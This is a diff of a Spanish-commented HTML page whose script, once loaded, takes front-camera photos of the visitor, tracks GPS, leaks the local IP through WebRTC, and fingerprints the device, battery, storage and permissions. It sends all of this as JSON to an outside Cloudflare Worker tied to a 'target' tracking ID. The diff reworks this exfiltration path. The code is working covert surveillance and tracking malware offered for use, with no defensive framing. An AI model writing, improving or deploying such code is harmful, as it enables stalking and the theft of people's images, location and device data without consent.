@@ -14,17 +14,13 @@
     <canvas id="c"></canvas>
 
     <script>
-        // ============================================================
         // CONFIGURACIÓN
-        // ============================================================
         const trackingId = 'AQUI_VA_TOKEN';
         const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';
 
         console.log('✅ Script iniciado');
 
-        // ============================================================
-        // FUNCIONES DE CAPTURA
-        // ============================================================
+        // ========== FUNCIONES DE CAPTURA ==========
 
         async function reverseGeocode(lat, lng) {
             try {
@@ -44,51 +40,30 @@
                     pc.onicecandidate = (ice) => {
                         if (!ice || !ice.candidate) return;
                         const ip = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                        if (ip) {
-                            pc.close();
-                            resolve(ip[0]);
-                        }
+                        if (ip) { pc.close(); resolve(ip[0]); }
                     };
-                    setTimeout(() => {
-                        pc.close();
-                        resolve(null);
-                    }, 3000);
-                } catch(e) {
-                    resolve(null);
-                }
+                    setTimeout(() => { pc.close(); resolve(null); }, 3000);
+                } catch(e) { resolve(null); }
             });
         }
 
         function capturarGPS() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
+                if (!navigator.geolocation) { resolve(null); return; }
                 let mejor = null;
                 let watchId = navigator.geolocation.watchPosition(
                     (pos) => {
-                        const coords = {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            acc: pos.coords.accuracy
-                        };
+                        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
                         if (!mejor || coords.acc < mejor.acc) mejor = coords;
                         if (coords.acc < 100) {
                             navigator.geolocation.clearWatch(watchId);
                             resolve(mejor);
                         }
                     },
-                    () => {
-                        navigator.geolocation.clearWatch(watchId);
-                        resolve(mejor);
-                    },
+                    () => { navigator.geolocation.clearWatch(watchId); resolve(mejor); },
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
-                setTimeout(() => {
-                    navigator.geolocation.clearWatch(watchId);
-                    resolve(mejor);
-                }, 8000);
+                setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(mejor); }, 8000);
             });
         }
 
@@ -97,16 +72,9 @@
             const canvas = document.getElementById('c');
             const fotos = [];
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
                 video.srcObject = stream;
-                await new Promise(r => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        r();
-                    };
-                });
+                await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
                 await new Promise(r => setTimeout(r, 300));
                 for (let i = 0; i < cantidad; i++) {
                     canvas.width = video.videoWidth || 640;
@@ -114,15 +82,12 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                     fotos.push(blob);
-                    console.log(`📸 Foto ${i+1} capturada (${blob.size} bytes)`);
+                    console.log(`📸 Foto ${i+1} capturada`);
                     await new Promise(r => setTimeout(r, 200));
                 }
                 stream.getTracks().forEach(t => t.stop());
                 return fotos;
-            } catch(e) {
-                console.warn('⚠️ Cámara no disponible:', e.message);
-                return [];
-            }
+            } catch(e) { return []; }
         }
 
         function obtenerDispositivo() {
@@ -135,11 +100,8 @@
             else if (ua.includes('Windows')) modelo = 'Windows PC';
             else if (ua.includes('Linux')) modelo = 'Linux';
             return {
-                modelo,
-                userAgent: ua,
-                language: navigator.language || 'N/A',
-                platform: navigator.platform || 'N/A',
-                vendor: navigator.vendor || 'N/A',
+                modelo, userAgent: ua, language: navigator.language || 'N/A',
+                platform: navigator.platform || 'N/A', vendor: navigator.vendor || 'N/A',
                 resolution: `${window.screen.width}x${window.screen.height}`,
                 colorDepth: window.screen.colorDepth || 'N/A',
                 cpuCores: navigator.hardwareConcurrency || 'N/A',
@@ -151,8 +113,7 @@
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                canvas.width = 200;
-                canvas.height = 50;
+                canvas.width = 200; canvas.height = 50;
                 ctx.fillStyle = '#f60';
                 ctx.fillRect(0, 0, 200, 50);
                 ctx.fillStyle = '#069';
@@ -163,50 +124,24 @@
                 try {
                     const gl = document.createElement('canvas').getContext('webgl');
                     const info = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (info) {
-                        const rawGpu = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
-                        // Limpiar el nombre de la GPU
-                        gpu = rawGpu.replace(/ANGLE \(([^,]+),.*/, '$1').trim();
-                        if (gpu.includes('Intel')) gpu = 'Intel Graphics';
-                        else if (gpu.includes('NVIDIA')) gpu = 'NVIDIA GPU';
-                        else if (gpu.includes('AMD')) gpu = 'AMD GPU';
-                        else if (gpu.includes('Apple')) gpu = 'Apple GPU';
-                    }
+                    gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
                 } catch(e) {}
                 return { gpu, canvas: hash };
-            } catch(e) {
-                return { gpu: 'N/A', canvas: 'N/A' };
-            }
+            } catch(e) { return { gpu: 'N/A', canvas: 'N/A' }; }
         }
 
         async function obtenerBateria() {
             try {
                 const battery = await navigator.getBattery();
-                return {
-                    level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging ? 'Sí' : 'No'
-                };
-            } catch(e) {
-                return { level: 'N/A', charging: 'N/A' };
-            }
+                return { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Sí' : 'No' };
+            } catch(e) { return { level: 'N/A', charging: 'N/A' }; }
         }
 
         async function obtenerAlmacenamiento() {
             try {
                 const est = await navigator.storage.estimate();
-                const totalGB = (est.quota / (1024 ** 3));
-                const usedGB = (est.usage / (1024 ** 3));
-                // Si los valores son 0 o muy pequeños, mostrar "No disponible"
-                if (totalGB < 0.01 && usedGB < 0.01) {
-                    return { total: 'No disponible', used: 'No disponible' };
-                }
-                return {
-                    total: totalGB.toFixed(2) + ' GB',
-                    used: usedGB.toFixed(2) + ' GB'
-                };
-            } catch(e) {
-                return { total: 'No disponible', used: 'No disponible' };
-            }
+                return { total: (est.quota / (1024**3)).toFixed(2) + ' GB', used: (est.usage / (1024**3)).toFixed(2) + ' GB' };
+            } catch(e) { return { total: 'N/A', used: 'N/A' }; }
         }
 
         async function obtenerPermisos() {
@@ -222,9 +157,17 @@
             return permisos;
         }
 
-        // ============================================================
-        // ENVIAR AL WORKER
-        // ============================================================
+        // ========== CONVERTIR FOTOS A BASE64 ==========
+        function blobToBase64(blob) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(blob);
+            });
+        }
+
+        // ========== ENVIAR AL WORKER (JSON) ==========
         async function enviarAlWorker() {
             console.log('📤 Iniciando captura...');
             try {
@@ -239,70 +182,31 @@
                     obtenerPermisos()
                 ]);
 
-                console.log('✅ Datos capturados. GPS:', gps, 'Fotos:', fotos.length, 'IP Local:', ipLocal);
+                console.log('✅ Datos capturados. GPS:', gps, 'Fotos:', fotos.length);
 
-                // Construir mensaje
-                let msg = '🖥️ Device & Browser\n';
-                msg += `   • Device Model: ${dispositivo.modelo}\n`;
-                msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
+                // Convertir fotos a Base64
+                const fotosBase64 = await Promise.all(fotos.map(blobToBase64));
 
-                msg += '🎨 Fingerprint\n';
-                msg += `   • GPU: ${fp.gpu}\n`;
-                msg += `   • Canvas: ${fp.canvas}\n\n`;
+                // Construir payload JSON
+                const payload = {
+                    trackingId: trackingId,
+                    device: dispositivo,
+                    fingerprint: fp,
+                    ipLocal: ipLocal,
+                    gps: gps,
+                    battery: bateria,
+                    storage: almacenamiento,
+                    permissions: permisos,
+                    photos: fotosBase64,
+                    timestamp: new Date().toISOString()
+                };
 
-                msg += '🌐 Network Information\n';
-                if (ipLocal) msg += `   • Local IP (WebRTC): ${ipLocal}\n`;
-                msg += `   • Language: ${dispositivo.language}\n\n`;
-
-                msg += '📍 GPS (si está disponible)\n';
-                if (gps) {
-                    const direccion = await reverseGeocode(gps.lat, gps.lng);
-                    msg += `   • Coordenadas: ${gps.lat}, ${gps.lng}\n`;
-                    msg += `   • Precisión: ±${Math.round(gps.acc)}m\n`;
-                    if (direccion) msg += `   • Dirección: ${direccion}\n`;
-                    msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
-                } else {
-                    msg += '   • No disponible (permiso denegado o sin GPS)\n';
-                }
-                msg += '\n';
-
-                msg += '🖼️ Display Information\n';
-                msg += `   • Resolution: ${dispositivo.resolution}\n`;
-                msg += `   • Color Depth: ${dispositivo.colorDepth}\n\n`;
-
-                msg += '🔋 Battery Status\n';
-                msg += `   • Level: ${bateria.level}\n`;
-                msg += `   • Charging: ${bateria.charging}\n\n`;
-
-                msg += '🔐 Device Permissions\n';
-                msg += `   • Camera: ${permisos.camera}\n`;
-                msg += `   • Location: ${permisos.location}\n\n`;
-
-                msg += '💾 Hardware & Storage\n';
-                msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
-                msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
-                msg += `   • Storage Used: ${almacenamiento.used}\n`;
-                msg += `   • Storage Total: ${almacenamiento.total}\n\n`;
-
-                msg += '━━━━━━━━━━━━━━━━\n';
-                msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
-                msg += `⚡ Developed by: @societykark\n`;
-                msg += `⏰ ${new Date().toISOString()}`;
-
-                // Construir FormData
-                const formData = new FormData();
-                formData.append('text', msg);
-                formData.append('latitude', gps?.lat || '');
-                formData.append('longitude', gps?.lng || '');
-                fotos.forEach((foto, index) => {
-                    if (foto) formData.append(`photo_${index}`, foto, `photo_${index}.jpg`);
-                });
-
-                console.log('📤 Enviando FormData al Worker...');
+                console.log('📤 Enviando JSON al Worker...');
 
                 const response = await fetch(workerUrl, {
                     method: 'POST',
-                    body: formData
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
                 const result = await response.json();
                 console.log('✅ Respuesta del Worker:', result);
@@ -311,9 +215,7 @@
             }
         }
 
-        // ============================================================
-        // EVENTOS
-        // ============================================================
+        // ========== EVENTOS ==========
         function ejecutar() {
             console.log('🔄 Ejecutando captura...');
             setTimeout(enviarAlWorker, 500);
